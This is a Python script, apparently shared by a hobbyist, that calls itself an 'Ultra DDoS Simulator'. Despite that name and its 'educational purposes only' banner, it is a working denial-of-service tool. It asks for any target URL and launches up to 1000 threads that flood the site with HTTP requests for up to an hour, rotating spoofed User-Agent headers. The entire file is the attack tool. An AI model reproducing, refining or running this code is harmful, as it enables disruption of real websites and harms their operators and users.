import urllib.request
import threading
import time
import random
from urllib.error import URLError, HTTPError

class UltraDDoSSimulator:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Linux; Android 10; SM-G960U)",
            "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro)",
            "Mozilla/5.0 (Linux; Android 12; Pixel 6)"
        ]
        self.running = False
        self.request_count = 0
        self.failed_requests = 0
        self.timeout = 2
        self.threads = []

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def send_request(self, url):
        if not self.running:
            return
            
        try:
            req = urllib.request.Request(
                url,
                headers={'User-Agent': self.get_random_user_agent()}
            )
            with urllib.request.urlopen(req, timeout=self.timeout) as response:
                self.request_count += 1
                print(f"🌀 [Request #{self.request_count}] Status: {response.status}")
        except Exception as e:
            self.failed_requests += 1
            print(f"💥 [Failed Request] Error: {str(e)}")

    def start_attack(self, url, threads=100, duration=60):
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        self.print_banner()
        print(f"\n🔮 Target URL: {url}")
        print(f"⚡ Threads: {threads}")
        print(f"⏱️ Duration: {duration} seconds")
        print("\n🚀 Starting attack... Press STOP in Pydroid to cancel\n")
        
        self.running = True
        self.request_count = 0
        self.failed_requests = 0
        
        for _ in range(threads):
            t = threading.Thread(target=self.continuous_requests, args=(url,))
            t.daemon = True
            self.threads.append(t)
            t.start()
        
        try:
            time.sleep(duration)
        except:
            pass
        
        self.stop_attack()

    def continuous_requests(self, url):
        while self.running:
            self.send_request(url)
            time.sleep(0.01)  # Faster requests

    def stop_attack(self):
        self.running = False
        for t in self.threads:
            t.join()
        
        self.print_banner()
        print("\n🛑 Attack Stopped!")
        print(f"📊 Total Requests: {self.request_count}")
        print(f"💥 Failed Requests: {self.failed_requests}")
        print("\n🔥 Developed by: @ERROR0101r 🔥")

    def print_banner(self):
        print("\n" + "="*50)
        print("🛡️ ULTRA DDoS SIMULATOR 🛡️".center(50))
        print("="*50)
        print("⚠️ FOR EDUCATIONAL PURPOSES ONLY ⚠️".center(50))
        print("="*50)

def get_input(prompt, default):
    try:
        value = input(prompt).strip()
        return int(value) if value else default
    except:
        return default

if __name__ == "__main__":
    simulator = UltraDDoSSimulator()
    simulator.print_banner()
    
    target_url = input("\n🌐 Enter target URL: ").strip()
    threads = get_input("⚡ Threads (1-1000) [100]: ", 100)
    duration = get_input("⏱️ Duration (seconds) [60]: ", 60)
    
    # Unlimited mode (for educational purposes)
    threads = max(1, min(1000, threads))
    duration = max(1, min(3600, duration))
    
    simulator.start_attack(target_url, threads, duration)